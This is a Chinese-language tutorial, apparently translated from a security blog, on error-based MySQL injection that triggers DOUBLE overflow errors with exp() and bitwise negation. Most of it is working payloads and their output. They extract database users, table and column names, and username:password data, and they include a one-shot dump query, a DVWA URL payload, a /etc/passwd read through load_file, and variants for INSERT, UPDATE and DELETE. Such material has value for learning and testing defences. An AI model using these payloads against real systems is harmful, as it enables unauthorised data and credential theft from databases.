# 使用exp进行SQL报错注入

此文为`BIGINT Overflow Error Based SQL Injection`的具体发现与实践

from:[https://osandamalith.wordpress.com/2015/07/15/error-based-sql-injection-using-exp/](https://osandamalith.wordpress.com/2015/07/15/error-based-sql-injection-using-exp/)

0x01 前言概述
=========

* * *

好消息好消息～作者又在`MySQL`中发现了一个`Double`型数据溢出。如果你想了解利用溢出来注出数据，你可以读一下作者之前发的博文：[BIGINT Overflow Error based injections](https://osandamalith.wordpress.com/2015/07/08/bigint-overflow-error-based-sql-injection/)，drops上面也有对应翻译，具体见[这里](http://drops.wooyun.org/web/8024)。当我们拿到`MySQL`里的函数时，作者比较感兴趣的是其中的数学函数，它们也应该包含一些数据类型来保存数值。所以作者就跑去测试看哪些函数会出现溢出错误。然后作者发现，当传递一个大于709的值时，`函数exp()`就会引起一个溢出错误。

```
mysql> select exp(709);
+-----------------------+
| exp(709)              |
+-----------------------+
| 8.218407461554972e307 |
+-----------------------+
1 row in set (0.00 sec) 

mysql> select exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'

```

在`MySQL`中，`exp`与`ln`和`log`的功能相反，简单介绍下，就是`log`和`ln`都返回以e为底数的对数，见等式：

![enter image description here](http://drops.javaweb.org/uploads/images/2a08cd9fde16c6d1af769b67e1fb57ea3adff50d.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/9e3783aa333596cd9a79cfa1d8a94dfb1f9f9e4d.jpg)

```
mysql> select log(15);
+------------------+
| log(15)          |
+------------------+
| 2.70805020110221 |
+------------------+
1 row in set (0.00 sec) 


mysql> select ln(15);
+------------------+
| ln(15)           |
+------------------+
| 2.70805020110221 |
+------------------+
1 row in set (0.00 sec)

```

指数函数为对数函数的反函数，`exp()`即为以e为底的对数函数，如等式：

![enter image description here](http://drops.javaweb.org/uploads/images/7e475298cd1e4f1eb83220c0256f10f68d08e146.jpg)

```
mysql> select exp(2.70805020110221);
+-----------------------+
| exp(2.70805020110221) |
+-----------------------+
|                    15 |
+-----------------------+
1 row in set (0.00 sec)

```

0x02 注入
=======

* * *

当涉及到注入时，我们使用否定查询来造成“`DOUBLE value is out of range`”的错误。作者之前的博文提到的，将0按位取反就会返回“`18446744073709551615`”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号`BIGINT`值。

```
mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec) 


mysql> select ~(select version());
+----------------------+
| ~(select version())  |
+----------------------+
| 18446744073709551610 |
+----------------------+
1 row in set, 1 warning (0.00 sec)

```

我们通过子查询与按位求反，造成一个`DOUBLE overflow error`，并借由此注出数据。

```
>`exp(~(select*from(select user())x))`

    mysql> select exp(~(select*from(select user())x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

```

0x03 注出数据
=========

* * *

得到表名：

```
select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));

```

得到列名：

```
select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));

```

检索数据：

```
select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));

```

0x04 一蹴而就
=========

* * *

这个查询可以从当前的上下文中dump出所有的tables与columns。我们也可以dump出所有的数据库，但由于我们是通过一个错误进行提取，它会返回很少的结果。

```
exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))

http://localhost/dvwa/vulnerabilities/sqli/?id=1' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))-- -&Submit=Submit#

```

![enter image description here](http://drops.javaweb.org/uploads/images/e11eaf28f467a0cad1929c1ba1c144dbc0399819.jpg)

0x04 读取文件
=========

* * *

你可以通过`load_file()`函数来读取文件，但作者发现有13行的限制，该语句也可以在`BIGINT overflow injections`中使用。

```
select exp(~(select*from(select load_file('/etc/passwd'))a));

```

![enter image description here](http://drops.javaweb.org/uploads/images/6f849e13bc54d61b247d54ec5c21c7224b57960d.jpg)

注意，你无法写文件，因为这个错入写入的只是0。

```
mysql> select exp(~(select*from(select 'hello')a)) into outfile 'C:/out.txt';
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'hello' from dual)))'    

# type C:\out.txt
0

```

0x05 Injection in Insert
========================

* * *

按部就班就好

```
mysql> insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'Eyre');
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

```

对于所有的`insert，update`和`delete`语句`DIOS`查询也同样可以使用。

```
mysql> insert into users (id, username, password) values (2, '' | exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)), 'Eyre');
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000
newdb::users::id
newdb::users::username
newdb::users::password' from dual)))'

```

0x06 Injection in Update
========================

* * *

```
mysql> update users set password='Peter' ^ exp(~(select*from(select user())x)) where id=4;
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

```

0x07 Injection in Delete
========================

* * *

```
mysql> delete from users where id='1' | exp(~(select*from(select user())x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

```

0x08 总结
=======

* * *

和前面的BIGINT注入一样，exp注入也适用于MySQL5.5.5及以上版本。以前的版本对于此情况则是“一言不发”。

```
mysql> select version();
+---------------------+
| version()           |
+---------------------+
| 5.0.45-community-nt |
+---------------------+
1 row in set (0.00 sec) 


mysql> select exp(710);
+----------+
| exp(710) |
+----------+
|   1.#INF |
+----------+
1 row in set (0.00 sec) 


mysql> select exp(~0);
+---------+
| exp(~0) |
+---------+
|  1.#INF |
+---------+
1 row in set (0.00 sec)

```

可能还有其他的函数会产生这种报错呦。（有待你发现啦：）